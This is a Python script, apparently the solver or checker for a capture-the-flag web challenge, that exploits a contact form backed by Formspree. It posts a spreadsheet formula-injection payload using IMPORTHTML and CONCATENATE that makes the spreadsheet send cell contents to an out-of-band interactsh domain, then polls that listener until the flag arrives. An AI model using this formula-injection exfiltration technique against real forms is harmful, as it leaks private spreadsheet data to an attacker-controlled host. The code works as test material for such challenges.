import requests
import argparse
import yaml
import re
import subprocess
import logging
import secrets
import json
import select
from urllib.parse import unquote
from time import time
from pathlib import Path
from base64 import b64encode

logger = logging.getLogger("secretary")

# For OOB interaction, if required
OAST = re.compile(r"\[.*INF.*\] ([a-z0-9]+\.[a-z0-9]+\.[a-z]+)")

# Load the flag dynamically from the meta file
HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


### IF WEBSITE ###
def test(url):
    ### If OOB interaction is required ###
    ### Can install interactsh here: https://github.com/projectdiscovery/interactsh
    p = subprocess.Popen(
        [
            "interactsh-client",
            "-json",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        universal_newlines=True,
    )

    while True:
        line = p.stderr.readline()
        if m := OAST.match(line):
            domain = m.group(1)
            logger.debug("OAST domain: %s", domain)
            break
    ### If OOB interaction is required ###

    res = requests.get(url)
    m = re.search(r'https://formspree.io/f/[a-z]+', res.text)
    formspree_url = m.group()

    logger.info('Formspree URL: %s', formspree_url)

    payload = f'=IMPORTHTML(CONCATENATE("http://{domain}/?q=",E2:E3),"table",4)'
    requests.post(f"{formspree_url}", data={"subject": payload})

    ### If you need data from OOB interaction ###
    start = time()
    flag = None

    poll_obj = select.poll()
    poll_obj.register(p.stdout, select.POLLIN)
    while time() - start < 180:
        poll_result = poll_obj.poll(0)
        if poll_result:
            line = p.stdout.readline()
            logger.debug(line)
            data = json.loads(line)
            if data["protocol"] != "http":
                continue
            else:
                logger.debug(data["raw-request"])
                assert FLAG in data["raw-request"]
                return

    assert False, "Flag not received OOB"

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    parser = argparse.ArgumentParser()

    ### LOCAL WEBSITE ###
    parser.add_argument("url", default="http://localhost:5000", nargs="?")
    args = parser.parse_args()
    test(args.url)
    ### LOCAL WEBSITE ###
